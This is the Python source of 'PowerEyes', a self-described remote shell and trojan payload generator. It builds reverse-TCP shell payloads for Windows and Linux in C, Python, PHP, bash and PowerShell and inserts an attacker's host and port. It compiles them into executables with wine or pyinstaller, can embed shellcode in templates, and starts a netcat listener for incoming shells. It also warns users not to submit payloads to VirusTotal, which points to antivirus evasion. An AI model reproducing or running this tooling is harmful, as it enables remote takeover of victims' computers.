#!/usr/bin/python3
#coding:utf-8
#AUTHOR : Dxvistxr

import socket
import subprocess
import os
import sys
import requests
import json
import time
from datetime import datetime
import platform
import hashlib
import base64
import binascii
import argparse


class tools_path():
    netcat = '/usr/bin/ncat'
    wine = '/root/.wine'
    tdm_gcc = '/root/.wine/drive_c/TDM-GCC-64/'
    base64 = '/usr/bin/base64'
    gcc_linux = '/usr/bin/gcc'
    python27_wine = '/root/.wine/drive_c/Python27'

banner = '''
__________                         ___________                    
\______   \______  _  __ __________\_   _____/__.__. ____   ______
 |     ___/  _ \ \/ \/ // __ \_  __ \    __)<   |  |/ __ \ /  ___/
 |    |  (  <_> )     /\  ___/|  | \/        \___  \  ___/ \___ \ 
 |____|   \____/ \/\_/  \___  >__| /_______  / ____|\___  >____  >
                            \/             \/\/         \/     \/ 
                        \033[1;97mBy Dxvistxr
                        \033[1;96mRemote Shell & Trojan \033[1;93mBy Dxvistxr \033[1;97mPayload Generator
                        Version : \033[1;97m0.1
'''

def encodebase64(char):
    encode_char = char.encode('utf-8')
    encode_base64 = base64.b64encode(encode_char)
    encode_b64 = encode_base64.decode('utf-8')
    print('\033[1;94mstring => \033[1;96m'+str(char))
    print('\033[1;94mbase64 => \033[1;96m'+str(encode_b64))

def decodebase64(char):
    encode_char = char.encode('utf-8')
    decode_base64 = base64.b64decode(encode_char)
    encode_b64 = decode_base64.decode('utf-8')
    print('\033[1;94mstring => \033[1;96m'+str(encode_b64))
    print('\033[1;94mbase64 => \033[1;96m'+str(char))

def get_ip():
    r = requests.get('https://ifconfig.me/ip')
    content_ip = r.text
    lanip = subprocess.Popen('hostname -I', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    out_lanip = lanip.stdout.read() + lanip.stderr.read()
    decode_lanip = out_lanip.decode('utf-8')
    print('\033[1;96m[*] YOUR PUBLIC IP : \033[1;94m'+str(content_ip))
    print('\033[1;96m[*] YOUR LOCAL IP : \033[1;94m'+str(decode_lanip))



def get_geo():
    re = requests.get('https://ipinfo.io/geo')
    content_text = re.text
    obj = json.loads(content_text)
    ip = obj['ip']
    city = obj['city']
    region = obj['region']
    country = obj['country']
    postal_code = obj['postal']
    print('\033[1;96m[\033[1;97m*\033[1;96m] IP : '+str(ip))
    print('\033[1;96m[\033[1;97m*\033[1;96m] CITY : '+str(city))
    print('\033[1;96m[\033[1;97m*\033[1;96m] COUNTRY : '+str(country))
    print('\033[1;96m[\033[1;97m*\033[1;96m] REGION : '+str(region))
    print('\033[1;96m[\033[1;97m*\033[1;96m] POSTAL : '+str(postal_code))

def get_platform():
    hostname = platform.node()
    os_plat = platform.system()
    os_version = platform.version()
    machine = platform.machine()
    print('\033[1;96m[\033[1;97m*\033[1;96m] OS : '+str(os_plat))
    print('\033[1;96m[\033[1;97m*\033[1;96m] VERSION : '+str(os_version))
    print('\033[1;96m[\033[1;97m*\033[1;96m] HOSTNAME : '+str(hostname))
    print('\033[1;96m[\033[1;97m*\033[1;96m] MACHINE : '+str(machine))

def sys_require():
    if 'Linux' not in platform.platform():
        sys.exit('[*] Linux System Required !')


def checking_tools(path):
    check_tools_exists = os.path.exists(path)
    if check_tools_exists ==True:
        print('\n')
    else:
        print('\033[1;91m[*] '+path+' not found !')
        sys.exit()


def loading():
    sys_require()
    os.system('clear')
    os.system('clear')
    print('\033[1;96m'+banner)
    print('\n')
    checking_tools(tools_path.netcat)
    checking_tools(tools_path.wine)
    checking_tools(tools_path.tdm_gcc)
    checking_tools(tools_path.base64) # coreutils
    checking_tools(tools_path.gcc_linux)
    checking_tools(tools_path.python27_wine)





def main():
    sys_require()
    os.system('clear')
    os.system('clear')
    print('\033[1;96m'+banner)
    print('\n')
    print('\033[1;91m[!] Warning Please Not Scan Payload In virustotal\033[1;97m')
    print('\033[1;92m[!] exemple : ')
    print('\033[1;96m              python3 PowerEyes.py -p windows/c/shell/rev_tcp -lh 192.168.1.70 -lp 7777 -o payload')
    print('\033[1;96m              python3 PowerEyes.py -i sys')
    print('\033[1;96m              python3 PowerEyes.py -s payload.exe')
    print('\033[1;96m              python3 PowerEyes.py -be test')
    print('\033[1;96m              python3 PowerEyes.py -bd dGVz')
    print('\033[1;96m              python3 PowerEyes.py -i ip')
    print('\033[1;96m              python3 PowerEyes.py -n 8888')
    print('\033[1;96m              python3 PowerEyes.py -p show')
    print('\033[1;96m              python3 PowerEyes.py -t py -tn template')
    print('\033[1;92m                   for show help type -h')
    print('\n\033[1;97m')
    parser = argparse.ArgumentParser()
    parser.add_argument('-i','--showinfo',help='Get Your Informations type | ip | sys | geo | update exemple : PowerEyes.py -i sys')
    parser.add_argument('-p','--payload',help='Set Your Payload for more payload type \033[1;96mshow\033[1;97m')
    parser.add_argument('-lh','--lhost',help='Set Your LHOST')
    parser.add_argument('-lp','--lport',help='Set Your LPORT')
    parser.add_argument('-s','--shellcode',help='Get Shellcode to Payload Compiled exemple : PowerEyes.py -s test.exe')
    parser.add_argument('-so','--shellcodesave',help='Write Shellcode In txt exemple : PowerEyes.py -so test.exe')
    parser.add_argument('-t','--template',help='Hide Shellcode In C Template or ( C Solely For Windows & Python Windows/Linux) \033[1;91mNot Unix \033[1;97mexemple: PowerEyes.py -t templatename')
    parser.add_argument('-tn','--templatename',help='Set Template Name')
    parser.add_argument('-n','--listennetcat',help='Listen Payload With Netcat exemple : PowerEyes.py -l 9999')
    parser.add_argument('-be','--base64encode',help='Encode String to base64\n')
    parser.add_argument('-bd','--base64decode',help='Decode base64 to string\n')
    parser.add_argument('-o','--output',help='Set Your Output Name')
    args = parser.parse_args()

    if args.showinfo =='network' or args.showinfo =='ip':
        loading()
        os.system('clear')
        os.system('clear')
        print('\033[1;96m'+banner)
        get_ip()
    
    if args.showinfo =='update':
        loading()
        os.system('clear')
        os.system('clear')
        print('\033[1;96m'+banner)
        print('\n')
        print('\033[1;92m[*] Futur Update Preview 17/03/2018')
        print('\033[1;92m[*] New Payload And Encoders Preview')
    
    if args.base64encode:
        loading()
        os.system('clear')
        os.system('clear')
        print('\033[1;96m'+banner)
        encodebase64(args.base64encode)
    
    if args.base64decode:
        loading()
        os.system('clear')
        os.system('clear')
        print('\033[1;96m'+banner)
        decodebase64(args.base64decode)
    
    if args.showinfo =='geo' or args.showinfo =='geolocate':
        loading()
        os.system('clear')
        os.system('clear')
        print('\033[1;96m'+banner)
        get_geo()
    
    if args.template =='c':
        loading()
        if args.templatename:
            os.system('clear')
            os.system('clear')
            print('\033[1;96m'+banner)
            os.system('cd module/ && base64 -d temp.txt > '+args.templatename+'.c')
            os.system('cd module/ && mv '+args.templatename+'.c ../output')
            enter_shellcode = str(input('\033[1;92m[*] Do You Want Implant Shellcode In Template With PowerEyes (yes/no) > '))
            if enter_shellcode =='yes' or enter_shellcode =='y':
                shellcode = str(input('\033[1;92m[*] Enter Shellcode >\n'))
                f=open('output/'+args.templatename+'.c','r')
                content = f.read()
                f.close()
                replace_shellcode = content.replace('SHELLCODE',shellcode)
                f=open('output/'+args.templatename+'.c','w')
                f.write(replace_shellcode)
                f.close()
                print('\033[1;92m[*] Template C Windows Generated !')
                compile_ = str(input('\033[1;92m[*] Do You Want Compile Template In EXE (yes/no) > '))
                if compile_ =='yes' or compile_ =='y':
                    print('\033[1;92m[*] Compile Template Wait..')
                    os.system('wine gcc output/'+args.templatename+'.c -o '+args.templatename+'.exe')
                    check_compiled = os.path.exists('output/'+args.templatename+'.exe')
                    if check_compiled ==True:
                        print('\033[1;92m[*] Template Compiled !')
                        print('\033[1;92m[*] Save As '+args.templateoutput+'.exe')
                    else:
                        print('\033[1;91m[*] Template Not Compiled !')
                
                elif compile_ =='no' or compile_ =='n':
                    print('\033[1;92m[*] Template Generated Save As output/'+args.templatename+'.c')
    
    if args.template =='py':
        loading()
        if args.templatename:
            os.system('clear')
            os.system('clear')
            print('\033[1;96m'+banner)
            os.system('cd module/ && base64 -d tempy.txt > '+args.templatename+'.py')
            os.system('cd module/ && mv '+args.templatename+'.py ../output')
            enter_shellcode = str(input('\033[1;92m[*] Do You Want Implant Shellcode In Template With PowerEyes (yes/no) > '))
            if enter_shellcode =='yes' or enter_shellcode =='y':
                shellcode = str(input('\033[1;92m[*] Enter Shellcode\n=>'))
                f=open('output/'+args.templatename+'.py','r')
                content = f.read()
                f.close()
                replace_shellcode = content.replace('SHELLCODE',shellcode)
                f=open('output/'+args.templatename+'.py','w')
                f.write(replace_shellcode)
                f.close()
                print('\033[1;92m[*] Template Generated With Shellcode Format : PY')
                compile_ = str(input('\033[1;92m[*] Do You Want Compile Template (yes/no) > '))
                if compile_ =='yes' or compile_ =='y':
                    os_compile = str(input('\033[1;92m[*] Compile Template For (windows/linux) > '))
                    print('\033[1;92m[*] Wait Moment Please... Compile Template..')
                    if os_compile =='windows':
                        os.system('wine pyinstaller -F -w output/'+args.templatename+'.py -n '+args.templatename+'.exe')
                        os.system('cd output/ && rm -r build')
                        os.system('cd output/ && cd dist && mv '+args.templatename+'.exe ../')
                        os.system('cd output/ && rm -r dist')
                        os.system('cd output/ && rm '+args.templatename+'.exe.spec')
                        os.system('cd output/ && rm -r __pycache__')
                        check_template_compiled = os.path.exists('output/'+args.templatename+'.exe')
                        if check_template_compiled ==True:
                            print('\033[1;92m[*] Template Compiled ! Save As output/'+args.templatename+'.exe')
                        else:
                            print('\033[1;91m[*] Template Not Compiled !')
                    
                    elif os_compile =='linux':
                        os.system('pyinstaller -F -w output/'+args.templatename+'.py -n '+args.templatename+'.elf')
                        os.system('cd output/ && rm -r build')
                        os.system('cd output/ && cd dist && mv '+args.templatename+'.elf ../')
                        os.system('cd output/ && rm -r dist')
                        os.system('cd output/ && rm '+args.templatename+'.elf.spec')
                        os.system('cd output/ && rm -r __pycache__')
                        check_template_compiled = os.path.exists('output/'+args.templatename+'.elf')
                        if check_template_compiled ==True:
                            print('\033[1;92m[*] Template Compiled ! Save As output/'+args.templatename+'.elf')
                        else:
                            print('\033[1;91m[*] Template Not Compiled !')
                
                elif compile_ =='no' or compile_ =='n':
                    print('\033[1;92m[*] Template Generated and Save As output/'+args.templatename+'.py')
            
            elif enter_shellcode =='no' or enter_shellcode =='n':
                print('\033[1;92m[*] Template Generated !')
    
    if args.shellcode:
        loading()
        os.system('clear')
        os.system('clear')
        print('\033[1;96m'+banner)
        os.system('cp '+args.shellcode+' module/')
        subprocess.Popen('cd module/ && base64 -d rws.txt > tempraw.sh && chmod 777 tempraw.sh', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        time.sleep(1)
        f = open('module/tempraw.sh','r')
        content = f.read()
        f.close()
        replace_app = content.replace('app',args.shellcode)
        w = open('module/tempraw.sh','w')
        w.write(replace_app)
        w.close()
        print('\033[1;96m[*] Your Shellcode =>\n\033[1;94m')
        os.system('cd module && ./tempraw.sh')
        print('\n')
        os.system('cd module && rm tempraw.sh')
        os.system('cd module && rm '+args.shellcode)
    
    if args.shellcodesave:
        loading()
        os.system('clear')
        os.system('clear')
        print('\033[1;96m'+banner)
        os.system('cp '+args.shellcodesave+' module/')
        subprocess.Popen('cd module/ && base64 -d rws.txt > tempraw.sh && chmod 777 tempraw.sh', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        time.sleep(1)
        f = open('module/tempraw.sh','r')
        content = f.read()
        f.close()
        replace_app = content.replace('app',args.shellcodesave)
        w = open('module/tempraw.sh','w')
        w.write(replace_app)
        w.close()
        out_shellcode = subprocess.Popen('cd module && ./tempraw.sh', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_shellcode = out_shellcode.stdout.read() + out_shellcode.stderr.read()
        f = open('output/'+args.shellcodesave+'.txt','w')
        decode_stdout = stdout_shellcode.decode('utf-8')
        f.write(decode_stdout)
        f.close()
        print('\033[1;92m[*] Shellcode Wried Save As output/'+args.shellcodesave+'.txt')
        print('\n')
        os.system('cd module && rm tempraw.sh')
        os.system('cd module && rm '+args.shellcodesave)

    
    if args.showinfo =='system' or args.showinfo =='sys' or args.showinfo =='platform':
        loading()
        os.system('clear')
        os.system('clear')
        print('\033[1;96m'+banner)
        get_platform()
    

    if args.listennetcat:
        loading()
        os.system('clear')
        os.system('clear')
        print('\033[1;96m'+banner)
        print('\033[1;96m[*] Listen on port '+args.listennetcat)
        print('\033[1;92m[*] Waiting Connection...')
        os.system('nc -lvp '+args.listennetcat)
    

    if args.payload =='show':
        loading()
        os.system('clear')
        os.system('clear')
        print('\033[1;96m'+banner)
        print('\033[1;92m[*] Payload : \n')
        print('\033[1;96m[*] windows/c/shell/rev_tcp')
        print('\033[1;96m[*] linux/c/shell/rev_tcp') 
        print('\033[1;96m[*] linux/python/shell/rev_tcp')
        print('\033[1;96m[*] linux/bash/shell/rev_tcp')
        print('\033[1;96m[*] windows/python/shell/rev_tcp')
        print('\033[1;96m[*] linux/php/shell/rev_tcp')
        print('\033[1;96m[*] windows/powershell/shell/rev_tcp')
        
    
    if args.payload =='windows/c/shell/rev_tcp' or args.payload =='windows/c/shell/reverse_tcp' or args.payload =='win/c/shell/reverse_tcp':
        loading()
        if args.lhost:
            if args.lport:
                if args.output:
                    check_windows_payload = os.path.exists(os.getcwd()+'/module/wcs.txt')
                    if check_windows_payload ==True:
                        print('\033[1;92m[*] Wait Moment Please Generating Payload....')
                        subprocess.Popen('cd module/ && base64 -d wcs.txt > '+args.output+'.c', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        os.system('cd module/ && mv '+args.output+'.c ../output')
                        f = open('output/'+args.output+'.c','r')
                        content = f.read()
                        f.close()
                        replace_lhost = content.replace('YOURLHOST',args.lhost)
                        w = open('output/'+args.output+'.c','w')
                        w.write(replace_lhost)
                        w.close()
                        f = open('output/'+args.output+'.c','r')
                        content = f.read()
                        f.close()
                        replace_lport = content.replace('YOURPORT',args.lport)
                        w = open('output/'+args.output+'.c','w')
                        w.write(replace_lport)
                        w.close()
                        os.system('wine g++ output/'+args.output+'.c -o output/'+args.output+'.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc')
                        print('\033[1;92m[*] Payload Generated ! save as output/'+args.output+'.exe')
                        os.system('rm output/'+args.output+'.c')
                    else:
                        print('\033[1;91m[*] Payload Not Found !')


    
    if args.payload =='windows/powershell/shell/rev_tcp':
        loading()
        if args.lhost:
            if args.lport:
                if args.output:
                    check_powershell_payload = os.path.exists(os.getcwd()+'/module/pwsh.txt')
                    if check_powershell_payload ==True:
                        print('\033[1;92m[*] Wait Moment Please Generating Payload....')
                        os.system('cd module/ && base64 -d pwsh.txt > '+args.output+'.bat')
                        os.system('cd module/ && mv '+args.output+'.bat ../output')
                        f=open('output/'+args.output+'.bat','r')
                        content = f.read()
                        f.close()
                        replace_lhost = content.replace('YOURLHOST',args.lhost)
                        f=open('output/'+args.output+'.bat','w')
                        f.write(replace_lhost)
                        f.close()
                        f=open('output/'+args.output+'.bat','r')
                        content = f.read()
                        f.close()
                        replace_lport = content.replace('YOURLPORT',args.lport)
                        f=open('output/'+args.output+'.bat','w')
                        f.write(replace_lport)
                        f.close()
                        print('\033[1;92m[*] Payload Generated Save As output/'+args.output+'.bat')
                    else:
                        print('\033[1;91m[*] Payload Source Not Found !')


    
    if args.payload =='windows/python/shell/rev_tcp':
        loading()
        if args.lhost:
            if args.lport:
                if args.output:
                    check_windows_payload = os.path.exists(os.getcwd()+'/module/wps.txt')
                    if check_windows_payload ==True:
                        print('\033[1;92m[*] Wait Moment Please Generating Payload....')
                        subprocess.Popen('cd module/ && base64 -d wps.txt > '+args.output+'.py', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        os.system('cd module/ && mv '+args.output+'.py ../output')
                        f=open('output/'+args.output+'.py','r')
                        content = f.read()
                        f.close()
                        replace_lhost = content.replace('YOURLHOST',args.lhost)
                        f=open('output/'+args.output+'.py','w')
                        f.write(replace_lhost)
                        f.close()
                        f=open('output/'+args.output+'.py','r')
                        content = f.read()
                        f.close()
                        replace_lport = content.replace('YOURLPORT',args.lport)
                        f=open('output/'+args.output+'.py','w')
                        f.write(replace_lport)
                        f.close()
                        os.system('wine python -m pip install pyinstaller')
                        print('\033[1;92m[*] Compiling Payload ....')
                        os.system('cd output/ && wine pyinstaller -F -w '+args.output+'.py -n '+args.output+'.exe')
                        os.system('cd output/ && rm -r build')
                        os.system('cd output/dist && mv '+args.output+'.exe ../')
                        os.system('cd output/ && rm -r dist/')
                        os.system('cd output/ && rm '+args.output+'.exe.spec')
                        os.system('cd output/ && rm '+args.output+'.py')
                        check_payload = os.path.exists('output/'+args.output+'.exe')
                        if check_payload ==True:
                            timestr = datetime.now().strftime('%H:%M:%S')
                            print('\033[1;92m[*] Payload Generated At '+str(timestr))
                        else:
                            print('\033[1;91m[*] Payload Not Generated !')
                    
                    else:
                        print('\033[1;91m[*] Payload Source Not Found !')


    if args.payload =='linux/c/shell/rev_tcp':
        loading()
        if args.lhost:
            if args.lport:
                if args.output:
                    check_linux_payload = os.path.exists(os.getcwd()+'/module/lcs.txt')
                    if check_linux_payload ==True:
                        print('\033[1;92m[*] Wait Moment Please Generating Payload....')
                        subprocess.Popen('cd module/ && base64 -d lcs.txt > '+args.output+'.c', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        os.system('cd module/ && mv '+args.output+'.c ../output')
                        f = open('output/'+args.output+'.c','r')
                        content = f.read()
                        f.close()
                        replace_lhost = content.replace('192.168.1.70',args.lhost)
                        w = open('output/'+args.output+'.c','w')
                        w.write(replace_lhost)
                        w.close()
                        f = open('output/'+args.output+'.c','r')
                        content = f.read()
                        f.close()
                        replace_lport = content.replace('5555',args.lport)
                        w = open('output/'+args.output+'.c','w')
                        w.write(replace_lport)
                        w.close()
                        os.system('gcc output/'+args.output+'.c -o output/'+args.output+'.elf')
                        print('\033[1;92m[*] Payload Generated ! save as output/'+args.output+'.elf')
                        os.system('rm output/'+args.output+'.c')
                    else:
                        print('\033[1;91m[*] Payload Not Generated !')
    
    if args.payload =='linux/python/shell/rev_tcp':
        loading()
        if args.lhost:
            if args.lport:
                if args.output:
                    check_linux_payload = os.path.exists(os.getcwd()+'/module/lps.txt')
                    if check_linux_payload ==True:
                        print('\033[1;92m[*] Generating Payload..Wait Moment')
                        subprocess.Popen('cd module/ && base64 -d lps.txt > '+args.output+'.py', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        os.system('cd module/ && mv '+args.output+'.py ../output')
                        f=open('output/'+args.output+'.py','r')
                        content = f.read()
                        f.close()
                        replace_lhost = content.replace('YOURLHOST',args.lhost)
                        f=open('output/'+args.output+'.py','w')
                        f.write(replace_lhost)
                        f.close()
                        f=open('output/'+args.output+'.py','r')
                        content = f.read()
                        f.close()
                        replace_lport = content.replace('YOURLPORT',args.lport)
                        f=open('output/'+args.output+'.py','w')
                        f.write(replace_lport)
                        f.close()
                        os.system('python2 -m pip install --upgrade pip && python3 -m pip install --upgrade pip')
                        os.system('python2 -m pip install pyinstaller')
                        os.system('cd output/ && pyinstaller -F -w '+args.output+'.py -n '+args.output+'.elf')
                        os.system('cd output/ && cd dist && mv '+args.output+'.elf ../')
                        os.system('cd output/ && rm -r dist && rm -r build && rm '+args.output+'.elf.spec')
                        os.system('cd output/ && rm '+args.output+'.py')
                        os.system('cd output/ && rm -r __pycache__')
                        check_payload = os.path.exists('output/'+args.output+'.elf')
                        if check_payload ==True:
                            timestr = datetime.now().strftime('%H:%M:%S')
                            print('\033[1;92m[*] Payload Generate At '+str(timestr))
                        else:
                            print('\033[1;91m[*] Payload Not Generate !')
                    
                    else:
                        print('\033[1;91m[*] Payload Source Not Found !')
    

    if args.payload =='linux/php/shell/rev_tcp':
        loading()
        if args.lhost:
            if args.lport:
                if args.output:
                    check_php_payload = os.path.exists(os.getcwd()+'/module/lphp.txt')
                    if check_php_payload ==True:
                        subprocess.Popen('cd module/ && base64 -d lphp.txt > '+args.output+'.php', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        os.system('cd module/ && mv '+args.output+'.php ../output')
                        f=open('output/'+args.output+'.php','r')
                        content = f.read()
                        f.close()
                        replace_lhost = content.replace('YOURLHOST',args.lhost)
                        f=open('output/'+args.output+'.php','w')
                        f.write(replace_lhost)
                        f.close()
                        f=open('output/'+args.output+'.php','r')
                        content = f.read()
                        f.close()
                        replace_lport = content.replace('YOURLPORT',args.lport)
                        f=open('output/'+args.output+'.php','w')
                        f.write(replace_lport)
                        f.close()
                        timestr = datetime.now().strftime('%H:%M:%S')
                        print('\033[1;92m[*] Payload Generated At '+str(timestr))
                    else:
                        print('\033[1;91m[*] Payload Source Not Found !')
    
    if args.payload =='linux/bash/shell/rev_tcp':
        loading()
        if args.lhost:
            if args.lport:
                if args.output:
                    check_bash_payload = os.path.exists(os.getcwd()+'/module/lbs.txt')
                    if check_bash_payload ==True:
                        os.system('cd module/ && cp lbs.txt '+args.output+'.sh')
                        os.system('cd module/ && mv '+args.output+'.sh ../output')
                        f=open('output/'+args.output+'.sh','r')
                        content = f.read()
                        f.close()
                        replace_lhost = content.replace('YOURLHOST',args.lhost)
                        f=open('output/'+args.output+'.sh','w')
                        f.write(replace_lhost)
                        f.close()
                        f=open('output/'+args.output+'.sh','r')
                        content = f.read()
                        f.close()
                        replace_lport = content.replace('YOURLPORT',args.lport)
                        f=open('output/'+args.output+'.sh','w')
                        f.write(replace_lport)
                        f.close()
                        timestr = datetime.now().strftime('%H:%M:%S')
                        print('\033[1;92m[*] Payload Generated At '+str(timestr))






main()